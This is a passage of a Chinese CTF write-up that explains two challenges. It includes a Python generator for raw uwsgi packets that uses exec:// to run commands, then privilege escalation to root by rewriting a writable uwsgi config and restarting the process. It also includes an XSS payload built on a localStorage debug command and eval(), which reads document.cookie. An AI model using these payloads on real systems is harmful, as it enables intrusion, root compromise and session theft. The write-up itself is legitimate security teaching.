<span class="py">mount</span> <span class="p">=</span> <span class="s">/=app:app</span>
<span class="py">master</span> <span class="p">=</span> <span class="s">true</span>
<span class="py">uid</span> <span class="p">=</span> <span class="s">nobody</span>
<span class="py">gid</span> <span class="p">=</span> <span class="s">nogroup</span>
<span class="py">workers</span> <span class="p">=</span> <span class="s">2</span>
<span class="py">buffer-size</span> <span class="p">=</span> <span class="s">65535</span>
<span class="py">enable-threads</span> <span class="p">=</span> <span class="s">true</span>
<span class="py">pidfile</span> <span class="p">=</span> <span class="s">/tmp/uwsgi.pid</span>
</code></pre></div></div>

<p>权限是 <code class="language-plaintext highlighter-rouge">nobody:nogroup</code>！怪不得。虽然我们是小小的 nobody，但是 PID 1 的 cmdline 还是能看的。查看 <code class="language-plaintext highlighter-rouge">/proc/1/cmdline</code>：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>/sbin/docker-init�--�sh�run.sh�
</code></pre></div></div>

<p><code class="language-plaintext highlighter-rouge">run.sh</code> 在哪里呢？找找就发现就在 <code class="language-plaintext highlighter-rouge">/usr/src/ufctf/run.sh</code>：</p>

<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">#!/bin/sh</span>

<span class="nb">cd</span> /usr/src/ufctf

<span class="nb">cp</span> /flagtmp /flag
<span class="nb">echo</span> <span class="s2">""</span> <span class="o">&gt;</span> /flagtmp

<span class="nb">chown </span>nobody <span class="nt">-R</span> <span class="nb">.</span> <span class="se">\</span>
    <span class="o">&amp;&amp;</span> <span class="nb">chmod </span>0666 <span class="nt">-R</span> /tmp/<span class="k">*</span> <span class="se">\</span>
    <span class="o">&amp;&amp;</span> <span class="nb">chown </span>root:root /flag <span class="se">\</span>
    <span class="o">&amp;&amp;</span> <span class="nb">chmod </span>0600 /flag

socat UNIX-LISTEN:/sock/socat.sock,fork,reuseaddr TCP4:127.0.0.1:8080 &amp;

nginx <span class="nt">-c</span> /etc/nginx/nginx.conf
<span class="nb">exec </span>supervisord <span class="nt">-n</span> <span class="nt">-c</span> /etc/supervisor-ctf.conf
</code></pre></div></div>

<p>看 nginx 没啥问题，但是 supervisord 是不是也没啥问题呢？</p>

<div class="language-ini highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nn">[supervisord]</span>
<span class="py">logfile</span><span class="p">=</span><span class="s">/tmp/supervisord.log ; main log file; default $CWD/supervisord.log</span>
<span class="py">logfile_maxbytes</span><span class="p">=</span><span class="s">50MB        ; max main logfile bytes b4 rotation; default 50MB</span>
<span class="py">logfile_backups</span><span class="p">=</span><span class="s">0           ; # of main logfile backups; 0 means none, default 10</span>
<span class="py">loglevel</span><span class="p">=</span><span class="s">info                ; log level; default info; others: debug,warn,trace</span>
<span class="py">pidfile</span><span class="p">=</span><span class="s">/tmp/supervisord.pid ; supervisord pidfile; default supervisord.pid</span>
<span class="py">nodaemon</span><span class="p">=</span><span class="s">true               ; start in foreground if true; default false</span>
<span class="py">silent</span><span class="p">=</span><span class="s">false                 ; no logs to stdout if true; default false</span>
<span class="py">minfds</span><span class="p">=</span><span class="s">1024                  ; min. avail startup file descriptors; default 1024</span>
<span class="py">minprocs</span><span class="p">=</span><span class="s">200                 ; min. avail process descriptors;default 200</span>

<span class="nn">[program:uwsgi]</span>
<span class="py">command</span><span class="p">=</span><span class="s">uwsgi --ini /tmp/uwsgi-ctf.ini</span>
<span class="py">user</span><span class="p">=</span><span class="s">root</span>
<span class="py">autorestart</span><span class="p">=</span><span class="s">true</span>
<span class="py">autostart</span><span class="p">=</span><span class="s">true</span>
<span class="py">startretries</span><span class="p">=</span><span class="s">3</span>
<span class="py">redirect_stderr</span><span class="p">=</span><span class="s">true</span>
<span class="py">startsecs</span><span class="p">=</span><span class="s">5</span>
<span class="py">stdout_logfile</span><span class="p">=</span><span class="s">/tmp/supervisor.log</span>
<span class="py">stopasgroup</span><span class="p">=</span><span class="s">true</span>
<span class="py">killasgroup</span><span class="p">=</span><span class="s">true</span>
<span class="py">priority</span><span class="p">=</span><span class="s">999</span>

<span class="nn">[program:chatbot]</span>
<span class="py">command</span><span class="p">=</span><span class="s">python /usr/src/ufctf/chatbot.py</span>
<span class="py">user</span><span class="p">=</span><span class="s">nobody</span>
<span class="py">autorestart</span><span class="p">=</span><span class="s">true</span>
<span class="py">autostart</span><span class="p">=</span><span class="s">true</span>
<span class="py">startretries</span><span class="p">=</span><span class="s">3</span>
<span class="py">redirect_stderr</span><span class="p">=</span><span class="s">true</span>
<span class="py">startsecs</span><span class="p">=</span><span class="s">5</span>
<span class="py">stdout_logfile</span><span class="p">=</span><span class="s">/tmp/supervisor.log</span>
<span class="py">stopasgroup</span><span class="p">=</span><span class="s">true</span>
<span class="py">killasgroup</span><span class="p">=</span><span class="s">true</span>
<span class="py">priority</span><span class="p">=</span><span class="s">999</span>
</code></pre></div></div>

<p>啊，chatbot！本来还以为 chatbot 是 root 权限的，希望落空了！顺便偷偷瞄一眼 chatbot 的代码：</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#!/usr/bin/env python
#coding:utf-8
</span>
<span class="kn">import</span> <span class="nn">socketserver</span>
<span class="kn">import</span> <span class="nn">base64</span><span class="p">,</span> <span class="n">random</span>


<span class="k">class</span> <span class="nc">ChatBotServer</span><span class="p">(</span><span class="n">socketserver</span><span class="p">.</span><span class="n">BaseRequestHandler</span><span class="p">):</span>
    <span class="k">def</span> <span class="nf">handle</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
        <span class="n">conn</span> <span class="o">=</span> <span class="bp">self</span><span class="p">.</span><span class="n">request</span>
        <span class="k">while</span> <span class="bp">True</span><span class="p">:</span>
            <span class="n">data</span> <span class="o">=</span> <span class="n">conn</span><span class="p">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">2048</span><span class="p">).</span><span class="n">decode</span><span class="p">(</span><span class="s">'utf8'</span><span class="p">)</span>
            <span class="k">if</span> <span class="n">data</span><span class="p">.</span><span class="n">strip</span><span class="p">()</span> <span class="o">==</span> <span class="s">"exit"</span><span class="p">:</span>
                <span class="k">print</span><span class="p">(</span><span class="s">"断开与%s的连接！"</span> <span class="o">%</span> <span class="p">(</span><span class="bp">self</span><span class="p">.</span><span class="n">client_address</span><span class="p">,))</span>
                <span class="n">conn</span><span class="p">.</span><span class="n">sendall</span><span class="p">((</span><span class="sa">b</span><span class="s">"%s</span><span class="se">\n</span><span class="s">"</span> <span class="o">%</span> <span class="n">base64</span><span class="p">.</span><span class="n">b64encode</span><span class="p">(</span><span class="s">'Goodbye!'</span><span class="p">)))</span>
                <span class="k">break</span>
            <span class="n">r</span> <span class="o">=</span> <span class="p">[</span><span class="sa">b</span><span class="s">'Hello!'</span><span class="p">,</span> <span class="sa">b</span><span class="s">'Alola!'</span><span class="p">,</span> <span class="sa">b</span><span class="s">'Nice to meet you.'</span><span class="p">,</span> <span class="sa">b</span><span class="s">'What a wonderful game!'</span><span class="p">,</span> <span class="sa">b</span><span class="s">'Try again and harder!'</span><span class="p">,</span> <span class="sa">b</span><span class="s">'Good luck to you!'</span><span class="p">]</span>
            <span class="n">conn</span><span class="p">.</span><span class="n">sendall</span><span class="p">((</span><span class="sa">b</span><span class="s">"%s</span><span class="se">\n</span><span class="s">"</span> <span class="o">%</span> <span class="n">base64</span><span class="p">.</span><span class="n">b64encode</span><span class="p">(</span><span class="n">random</span><span class="p">.</span><span class="n">choice</span><span class="p">(</span><span class="n">r</span><span class="p">))))</span>
            <span class="k">break</span>

<span class="k">if</span> <span class="n">__name__</span> <span class="o">==</span> <span class="s">'__main__'</span><span class="p">:</span>
    <span class="n">server</span> <span class="o">=</span> <span class="n">socketserver</span><span class="p">.</span><span class="n">ThreadingTCPServer</span><span class="p">((</span><span class="s">'127.0.0.1'</span><span class="p">,</span> <span class="mi">1234</span><span class="p">),</span> <span class="n">ChatBotServer</span><span class="p">)</span>
    <span class="k">print</span><span class="p">(</span><span class="s">"启动ChatBot！"</span><span class="p">)</span>
    <span class="n">server</span><span class="p">.</span><span class="n">serve_forever</span><span class="p">()</span>
</code></pre></div></div>

<p>也没啥问题。似乎陷入了僵局。去搜了搜和 uwsgi 相关的 ctf writeup，发现 uwsgi 有个自己的 protocol，而且似乎不会验证用户权限，而且<strong>可以用 exec 伪协议执行任意命令</strong>！</p>

<p>找了个网上的脚本魔改（写 wp 的时候找不到是基于哪个脚本改的了，如果有人知道的话欢迎告诉我）：</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">host</span> <span class="o">=</span> <span class="s">"127.0.0.1"</span>

<span class="k">def</span> <span class="nf">fromhex</span><span class="p">(</span><span class="n">data</span><span class="p">):</span>
    <span class="n">padded</span> <span class="o">=</span> <span class="nb">hex</span><span class="p">(</span><span class="n">data</span> <span class="k">if</span> <span class="nb">isinstance</span><span class="p">(</span><span class="n">data</span><span class="p">,</span> <span class="nb">int</span><span class="p">)</span> <span class="k">else</span> <span class="nb">len</span><span class="p">(</span><span class="n">data</span><span class="p">))[</span><span class="mi">2</span><span class="p">:].</span><span class="n">rjust</span><span class="p">(</span><span class="mi">4</span><span class="p">,</span> <span class="s">'0'</span><span class="p">)</span>
    <span class="k">return</span> <span class="nb">bytes</span><span class="p">.</span><span class="n">fromhex</span><span class="p">(</span><span class="n">padded</span><span class="p">)[::</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span>

<span class="k">def</span> <span class="nf">generate_packet</span><span class="p">(</span><span class="n">cmd</span><span class="p">):</span>
    <span class="n">packet</span> <span class="o">=</span> <span class="p">{</span>
        <span class="s">'SERVER_PROTOCOL'</span><span class="p">:</span> <span class="s">'HTTP/1.1'</span><span class="p">,</span>
        <span class="s">'REQUEST_METHOD'</span><span class="p">:</span> <span class="s">'GET'</span><span class="p">,</span>
        <span class="s">'PATH_INFO'</span><span class="p">:</span> <span class="s">"/nowhere"</span><span class="p">,</span>
        <span class="s">'REQUEST_URI'</span><span class="p">:</span> <span class="s">"/nowhere"</span><span class="p">,</span>
        <span class="s">'QUERY_STRING'</span><span class="p">:</span> <span class="s">""</span><span class="p">,</span>
        <span class="s">'SERVER_NAME'</span><span class="p">:</span> <span class="n">host</span><span class="p">,</span>
        <span class="s">'HTTP_HOST'</span><span class="p">:</span> <span class="n">host</span><span class="p">,</span>
        <span class="s">'UWSGI_FILE'</span><span class="p">:</span> <span class="sa">f</span><span class="s">"exec://</span><span class="si">{</span><span class="n">cmd</span><span class="si">}</span><span class="s">"</span><span class="p">,</span>
        <span class="s">'SCRIPT_NAME'</span><span class="p">:</span> <span class="s">"/nowhere"</span>
    <span class="p">}</span>

    <span class="n">pk</span> <span class="o">=</span> <span class="sa">b</span><span class="s">''</span>
    <span class="k">for</span> <span class="n">k</span><span class="p">,</span> <span class="n">v</span> <span class="ow">in</span> <span class="n">packet</span><span class="p">.</span><span class="n">items</span><span class="p">()</span> <span class="k">if</span> <span class="nb">hasattr</span><span class="p">(</span><span class="n">packet</span><span class="p">,</span> <span class="s">'items'</span><span class="p">)</span> <span class="k">else</span> <span class="n">packet</span><span class="p">:</span>
        <span class="n">pk</span> <span class="o">+=</span> <span class="n">fromhex</span><span class="p">(</span><span class="n">k</span><span class="p">)</span> <span class="o">+</span> <span class="n">k</span><span class="p">.</span><span class="n">encode</span><span class="p">(</span><span class="s">'utf8'</span><span class="p">)</span> <span class="o">+</span> <span class="n">fromhex</span><span class="p">(</span><span class="n">v</span><span class="p">)</span> <span class="o">+</span> <span class="n">v</span><span class="p">.</span><span class="n">encode</span><span class="p">(</span><span class="s">'utf8'</span><span class="p">)</span>
    <span class="n">result</span> <span class="o">=</span> <span class="sa">b</span><span class="s">'</span><span class="se">\x00</span><span class="s">'</span> <span class="o">+</span> <span class="n">fromhex</span><span class="p">(</span><span class="n">pk</span><span class="p">)</span> <span class="o">+</span> <span class="sa">b</span><span class="s">'</span><span class="se">\x00</span><span class="s">'</span> <span class="o">+</span> <span class="n">pk</span>

    <span class="k">return</span> <span class="n">result</span>

<span class="n">packet</span> <span class="o">=</span> <span class="n">generate_packet</span><span class="p">(</span><span class="s">"ls / &gt; /tmp/taoky"</span><span class="p">)</span>
<span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="s">"payload"</span><span class="p">,</span> <span class="s">"wb"</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
    <span class="n">f</span><span class="p">.</span><span class="n">write</span><span class="p">(</span><span class="n">packet</span><span class="p">)</span>
</code></pre></div></div>

<p>执行之后做一次 base64，用主页的聊天功能对准 127.0.0.1:3031 发送，然后用 chatbot 页面看 <code class="language-plaintext highlighter-rouge">/tmp/taoky</code>，就能读取 <code class="language-plaintext highlighter-rouge">/tmp/taoky</code> 看到 <code class="language-plaintext highlighter-rouge">ls /</code> 的结果了。（对应的，stderr 的结果在 <code class="language-plaintext highlighter-rouge">/tmp/supervisor.log</code> 里头）</p>

<blockquote>
  <p>虽然现在还只是无权限的用户 不过 即使只是 <code class="language-plaintext highlighter-rouge">nobody</code></p>

  <p>也会想着在哪一天 灿烂地成为 <code class="language-plaintext highlighter-rouge">root</code> 的吧</p>
</blockquote>

<p>即使能 RCE 了，我们还是 nobody 用户。受到之前做的题目带来的 stereotype 的影响，我的第一反应是找 <code class="language-plaintext highlighter-rouge">setuid</code> binary，但是怎么找都找不到：执行 <code class="language-plaintext highlighter-rouge">find / -perm -u=s -type f</code>，可以发现找到的文件都是没法利用的。这里卡住了好久。</p>

<p>之后跑命令的时候发现，好像 uwsgi 配置 nobody 可以写入啊！而且 supervisor 检测到服务挂掉重启的时候最开始是 root 用户的身份启动服务的啊！所以 payload 大致长成这样：</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">ini</span> <span class="o">=</span> <span class="s">"""[uwsgi]
socket = :3031
chdir = /usr/src/ufctf
manage-script-name = true
mount = /=app:app
master = true
uid = root
gid = root
workers = 2
buffer-size = 65535
enable-threads = true
pidfile = /tmp/uwsgi.pid"""</span>

<span class="c1">#packet = generate_packet(f"echo '{ini}' &gt; /tmp/uwsgi-ctf.ini")
</span><span class="n">packet</span> <span class="o">=</span> <span class="n">generate_packet</span><span class="p">(</span><span class="s">"ps aux &gt; /tmp/taoky"</span><span class="p">)</span>
<span class="c1">#packet = generate_packet("kill -INT 52")
</span><span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="s">"payload"</span><span class="p">,</span> <span class="s">"wb"</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
    <span class="n">f</span><span class="p">.</span><span class="n">write</span><span class="p">(</span><span class="n">packet</span><span class="p">)</span>
</code></pre></div></div>

<p>先写入到 <code class="language-plaintext highlighter-rouge">/tmp/uwsgi-ctf.ini</code>，然后 <code class="language-plaintext highlighter-rouge">ps aux</code> 得到 uwsgi 主进程的进程号，然后对着这个进程 <code class="language-plaintext highlighter-rouge">kill -INT</code>（<code class="language-plaintext highlighter-rouge">kill -9</code> 好像会把整个服务搞挂），卡过一会之后我们就变身 root 了！（可以在 supervisor.log 里验证这一点）</p>

<p>既然成为了 root，读取 flag 什么的自然不在话下。</p>

<h2 id="q小树洞的一大步">Q小树洞的一大步</h2>

<p><em>（第二阶段完成）</em></p>

<blockquote>
  <p>带着这些问题（指能不能 XSS），我们来审视一下Q小树洞。我们不得不面对一个非常尴尬的事实，那就是，每个人（指所有比赛选手）都不得不面对这些问题。Q小树洞因何而发生（XSS）？本人也是经过了深思熟虑，在每个日日夜夜思考这个问题。在这种困难的抉择下，本人思来想去，寝食难安（指因为玩 geekgame 晚上不睡觉）。</p>
</blockquote>

<p>因为菜，所以第一阶段不想去逆向 webpack 生成的那堆东西（第一阶段先把壁纸换成<a href="https://prob15-qkuhole.geekgame.pku.edu.cn/hole/static/bg/yurucamp.jpg">露营天下第一</a>，然后只发现了 URL <code class="language-plaintext highlighter-rouge">#</code> 之后可以加搜索词，以及 <a href="https://pkuhelper.pku.edu.cn/hole/">pkuhelper 版的 P 大树洞</a>所谓的「GPL 协议开源」近乎是假的，指向的是一个 2020 年初已经 archive 的版本，与实际运行的版本差别不小，想通过检查 commit 记录来找安全更新的计划落空了）。第二阶段拿到了源代码，所以题目好做了很多。</p>

<p class="center"><img src="/pictures/geekgame-wp/extra/yurucamp.jpg" alt="yurucamp" /></p>

<p class="center"><em>图 7. 露营天下第一！（树洞前端代码中的背景图片之一，原图来自<a href="https://yurucamp.jp/camping/content/themes/ycp-pc/images/c1_bg.jpg">《摇曳露营》动画官网背景图</a>）</em></p>

<p>先把 React 源代码全部下下来（通过浏览器检查元素），过一遍发现了一个「后门」和两个可能的问题点：</p>

<ul>
  <li><code class="language-plaintext highlighter-rouge">//setflag key=value</code> 可以修改 localStorage 中 key 项内容为 value。</li>
  <li>既然可以任意修改 localStorage 的内容，那么和 localStorage 有关的点都可能出问题。最有可能出问题的是：
    <ul>
      <li><code class="language-plaintext highlighter-rouge">APPSWITCHER_ITEMS</code>: 有个危险的 <code class="language-plaintext highlighter-rouge">eval()</code></li>
      <li><code class="language-plaintext highlighter-rouge">hole_config</code>: 可以加载任意配置，改背景图的部分说不定可以用 <code class="language-plaintext highlighter-rouge">javascript:</code> 伪协议？</li>
    </ul>
  </li>
</ul>

<p>PS: <code class="language-plaintext highlighter-rouge">//setflag</code> 功能看起来应该是为了方便开发者调试用的，我这里称之为「后门」仅仅是因为叫起来方便，没有恶意。</p>

<p>为了确保环境一致，手动安装 selenium 和最新的 Chromium webdriver。<strong>如果直接用自己的浏览器环境测试，因为首先不同浏览器的策略细节不同、可能会受到扩展干扰，而且用户设置（特别是关于 cookie 的）可能和 XSS bot 的不同，会造成其实可以跑的 payload 本地跑不了的问题</strong>。</p>

<p>首先试试伪协议，尽管网络上很多人写 XSS 的文章都会把它列成一种 XSS 的「方法」，像这样：</p>

<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;img</span> <span class="na">src=</span><span class="s">"javascript:alert('这样就能 XSS 了，很棒吧！')"</span> <span class="nt">/&gt;</span>
</code></pre></div></div>

<p>对应 Q 小树洞的代码，类似于这样：</p>

<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"bg-img"</span> <span class="na">style=</span><span class="s">"background: transparent url('javascript:alert(\'它工作吗？\')') repeat scroll center center / cover;"</span><span class="nt">&gt;&lt;/div&gt;</span>
</code></pre></div></div>

<p><strong>但是啊，自己测试一下就会发现，这样根本不行！至少 Chrome 和 Firefox 都不行！Chrome 会直接给你一个 <code class="language-plaintext highlighter-rouge">net::ERR_UNKNOWN_URL_SCHEME</code> 啊！不知道为什么都 2021 年了，还有人拿这个「技巧」抄来抄去的！</strong></p>

<p>那就重点看 <code class="language-plaintext highlighter-rouge">eval()</code> 附近的逻辑。引入 <code class="language-plaintext highlighter-rouge">eval()</code> 的是对应 React 组件的 <code class="language-plaintext highlighter-rouge">check_fix()</code> 方法：</p>

<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">check_fix</span><span class="p">()</span> <span class="p">{</span>
    <span class="k">if</span><span class="p">(</span><span class="k">this</span><span class="p">.</span><span class="nx">state</span><span class="p">.</span><span class="nx">apps</span> <span class="o">&amp;&amp;</span> <span class="k">this</span><span class="p">.</span><span class="nx">state</span><span class="p">.</span><span class="nx">apps</span><span class="p">.</span><span class="nx">fix</span> <span class="o">&amp;&amp;</span> <span class="k">this</span><span class="p">.</span><span class="nx">state</span><span class="p">.</span><span class="nx">apps</span><span class="p">.</span><span class="nx">fix</span><span class="p">[</span><span class="k">this</span><span class="p">.</span><span class="nx">props</span><span class="p">.</span><span class="nx">appid</span><span class="p">])</span>
        <span class="nx">setTimeout</span><span class="p">(()</span><span class="o">=&gt;</span><span class="p">{</span>
            <span class="nb">window</span><span class="p">.</span><span class="nx">HOTFIX_CONTEXT</span><span class="o">=</span><span class="p">{</span>
                <span class="na">build_info</span><span class="p">:</span> <span class="nx">process</span><span class="p">.</span><span class="nx">env</span><span class="p">.</span><span class="nx">REACT_APP_BUILD_INFO</span> <span class="o">||</span> <span class="dl">'</span><span class="s1">---</span><span class="dl">'</span><span class="p">,</span>
                <span class="na">build_env</span><span class="p">:</span> <span class="nx">process</span><span class="p">.</span><span class="nx">env</span><span class="p">.</span><span class="nx">NODE_ENV</span><span class="p">,</span>
            <span class="p">};</span>
            <span class="nb">eval</span><span class="p">(</span><span class="k">this</span><span class="p">.</span><span class="nx">state</span><span class="p">.</span><span class="nx">apps</span><span class="p">.</span><span class="nx">fix</span><span class="p">[</span><span class="k">this</span><span class="p">.</span><span class="nx">props</span><span class="p">.</span><span class="nx">appid</span><span class="p">]);</span>
        <span class="p">},</span><span class="mi">1</span><span class="p">);</span> <span class="c1">// make it async so failures won't be critical</span>
<span class="p">}</span>
</code></pre></div></div>

<p>看起来是处理动态下发前端代码修复的代码，会在 1 ms 后执行。再看看 <code class="language-plaintext highlighter-rouge">componentDidMount</code> 的逻辑：</p>

<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">componentDidMount</span><span class="p">()</span> <span class="p">{</span>
    <span class="k">this</span><span class="p">.</span><span class="nx">check_fix</span><span class="p">();</span>
    <span class="nx">setTimeout</span><span class="p">(()</span><span class="o">=&gt;</span><span class="p">{</span>
        <span class="nx">fetch</span><span class="p">(</span><span class="nx">SWITCHER_DATA_URL</span><span class="p">)</span>
            <span class="p">.</span><span class="nx">then</span><span class="p">((</span><span class="nx">res</span><span class="p">)</span><span class="o">=&gt;</span><span class="p">{</span>
                <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nx">res</span><span class="p">.</span><span class="nx">ok</span><span class="p">)</span> <span class="k">throw</span> <span class="nb">Error</span><span class="p">(</span><span class="s2">`网络错误 </span><span class="p">${</span><span class="nx">res</span><span class="p">.</span><span class="nx">status</span><span class="p">}</span><span class="s2"> </span><span class="p">${</span><span class="nx">res</span><span class="p">.</span><span class="nx">statusText</span><span class="p">}</span><span class="s2">`</span><span class="p">);</span>
                <span class="k">return</span> <span class="nx">res</span><span class="p">.</span><span class="nx">text</span><span class="p">();</span>
            <span class="p">})</span>
            <span class="p">.</span><span class="nx">then</span><span class="p">((</span><span class="nx">txt</span><span class="p">)</span><span class="o">=&gt;</span><span class="p">{</span>
                <span class="k">if</span><span class="p">(</span><span class="nx">txt</span><span class="o">!==</span><span class="nx">localStorage</span><span class="p">[</span><span class="dl">'</span><span class="s1">APPSWITCHER_ITEMS</span><span class="dl">'</span><span class="p">])</span> <span class="p">{</span>
                    <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="dl">'</span><span class="s1">loaded new appswitcher items</span><span class="dl">'</span><span class="p">,</span><span class="nx">txt</span><span class="p">);</span>
                    <span class="nx">localStorage</span><span class="p">[</span><span class="dl">'</span><span class="s1">APPSWITCHER_ITEMS</span><span class="dl">'</span><span class="p">]</span><span class="o">=</span><span class="nx">txt</span><span class="p">;</span>

                    <span class="k">this</span><span class="p">.</span><span class="nx">setState</span><span class="p">({</span>
                        <span class="na">apps</span><span class="p">:</span> <span class="k">this</span><span class="p">.</span><span class="nx">get_apps_from_localstorage</span><span class="p">(),</span>
                    <span class="p">});</span>
                <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
                    <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="dl">'</span><span class="s1">appswitcher items unchanged</span><span class="dl">'</span><span class="p">);</span>
                <span class="p">}</span>
            <span class="p">})</span>
            <span class="p">.</span><span class="k">catch</span><span class="p">((</span><span class="nx">e</span><span class="p">)</span><span class="o">=&gt;</span><span class="p">{</span>
                <span class="nx">console</span><span class="p">.</span><span class="nx">error</span><span class="p">(</span><span class="dl">'</span><span class="s1">loading appswitcher items failed</span><span class="dl">'</span><span class="p">);</span>
                <span class="nx">console</span><span class="p">.</span><span class="nx">trace</span><span class="p">(</span><span class="nx">e</span><span class="p">);</span>
            <span class="p">});</span>
    <span class="p">},</span><span class="mi">500</span><span class="p">);</span>
<span class="p">}</span>
</code></pre></div></div>

<p>而这个组件的构造函数：</p>

<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">constructor</span><span class="p">(</span><span class="nx">props</span><span class="p">)</span> <span class="p">{</span>
    <span class="k">super</span><span class="p">(</span><span class="nx">props</span><span class="p">);</span>
    <span class="k">this</span><span class="p">.</span><span class="nx">state</span><span class="o">=</span><span class="p">{</span>
        <span class="na">apps</span><span class="p">:</span> <span class="k">this</span><span class="p">.</span><span class="nx">get_apps_from_localstorage</span><span class="p">(),</span>
    <span class="p">}</span>
<span class="p">}</span>
</code></pre></div></div>

<p><code class="language-plaintext highlighter-rouge">get_apps_from_localstorage()</code>:</p>

<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">get_apps_from_localstorage</span><span class="p">()</span> <span class="p">{</span>
    <span class="kd">let</span> <span class="nx">ret</span><span class="o">=</span><span class="nx">FALLBACK_APPS</span><span class="p">;</span>
    <span class="k">if</span><span class="p">(</span><span class="nx">localStorage</span><span class="p">[</span><span class="dl">'</span><span class="s1">APPSWITCHER_ITEMS</span><span class="dl">'</span><span class="p">])</span>
        <span class="k">try</span> <span class="p">{</span>
            <span class="kd">let</span> <span class="nx">content</span><span class="o">=</span><span class="nx">JSON</span><span class="p">.</span><span class="nx">parse</span><span class="p">(</span><span class="nx">localStorage</span><span class="p">[</span><span class="dl">'</span><span class="s1">APPSWITCHER_ITEMS</span><span class="dl">'</span><span class="p">])[</span><span class="nx">SWITCHER_DATA_VER</span><span class="p">];</span>
            <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nx">content</span> <span class="o">||</span> <span class="o">!</span><span class="nx">content</span><span class="p">.</span><span class="nx">bar</span><span class="p">)</span>
                <span class="k">throw</span> <span class="k">new</span> <span class="nb">Error</span><span class="p">(</span><span class="dl">'</span><span class="s1">content is empty</span><span class="dl">'</span><span class="p">);</span>

            <span class="nx">ret</span><span class="o">=</span><span class="nx">content</span><span class="p">;</span>
        <span class="p">}</span> <span class="k">catch</span><span class="p">(</span><span class="nx">e</span><span class="p">)</span> <span class="p">{</span>
            <span class="nx">console</span><span class="p">.</span><span class="nx">error</span><span class="p">(</span><span class="dl">'</span><span class="s1">load appswitcher items from localstorage failed</span><span class="dl">'</span><span class="p">);</span>
            <span class="nx">console</span><span class="p">.</span><span class="nx">trace</span><span class="p">(</span><span class="nx">e</span><span class="p">);</span>
        <span class="p">}</span>

    <span class="k">return</span> <span class="nx">ret</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></div></div>

<p>查 React 的文档可以知道，组件初始化 (Mounting) 的时候执行顺序如下：</p>

<ul>
  <li><code class="language-plaintext highlighter-rouge">constructor()</code></li>
  <li><code class="language-plaintext highlighter-rouge">static getDerivedStateFromProps()</code></li>
  <li><code class="language-plaintext highlighter-rouge">render()</code></li>
  <li><code class="language-plaintext highlighter-rouge">componentDidMount()</code></li>
</ul>

<p>所以实际如果有 fix 的时候发生的事情：</p>

<ol>
  <li>组件加载，从 localStorage 读取到 <code class="language-plaintext highlighter-rouge">apps</code> 数据并设置状态。</li>
  <li>设置 <code class="language-plaintext highlighter-rouge">check_fix()</code> 1ms 后执行。</li>
  <li>设置获取最新组件 500ms 后执行，它会用服务器上对应的 JSON 文件更新 localStorage 和组件 <code class="language-plaintext highlighter-rouge">apps</code> 的状态。</li>
</ol>

<p><code class="language-plaintext highlighter-rouge">AppSwitcher</code> 在 Title.js 里面被使用：</p>

<div class="language-jsx highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">&lt;</span><span class="nc">AppSwitcher</span> <span class="na">appid</span><span class="p">=</span><span class="s">"hole"</span> <span class="p">/&gt;</span>
</code></pre></div></div>

<p>参考正常加载后的 localStorage 内容，payload 大致长成这样：</p>

<div class="language-json highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="err">//setflag</span><span class="w"> </span><span class="err">APPSWITCHER_ITEMS=</span><span class="p">{</span><span class="nl">"switcher_2"</span><span class="p">:{</span><span class="nl">"bar"</span><span class="p">:[[</span><span class="s2">"hole"</span><span class="p">,</span><span class="s2">"树洞"</span><span class="p">,</span><span class="s2">"#"</span><span class="p">,</span><span class="s2">"#"</span><span class="p">,</span><span class="kc">null</span><span class="p">,</span><span class="kc">false</span><span class="p">]],</span><span class="nl">"dropdown"</span><span class="p">:[[</span><span class="s2">"homepage"</span><span class="p">,</span><span class="s2">"客户端"</span><span class="p">,</span><span class="s2">"#"</span><span class="p">,</span><span class="s2">"#"</span><span class="p">,</span><span class="kc">null</span><span class="p">,</span><span class="kc">false</span><span class="p">]],</span><span class="nl">"fix"</span><span class="p">:{</span><span class="nl">"hole"</span><span class="p">:</span><span class="s2">"console.log(document.cookie);"</span><span class="p">}}}</span><span class="w">
</span></code></pre></div></div>

<p>另外，我们需要看一下 <code class="language-plaintext highlighter-rouge">//setflag</code>「后门」的逻辑：</p>

<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">const</span> <span class="nx">flag_re</span><span class="o">=</span><span class="sr">/^</span><span class="se">\/\/</span><span class="sr">setflag </span><span class="se">([</span><span class="sr">a-zA-Z0-9_</span><span class="se">]</span><span class="sr">+</span><span class="se">)</span><span class="sr">=</span><span class="se">(</span><span class="sr">.*</span><span class="se">)</span><span class="sr">$/</span><span class="p">;</span>

<span class="c1">//（省略）</span>

<span class="nx">componentDidMount</span><span class="p">()</span> <span class="p">{</span>
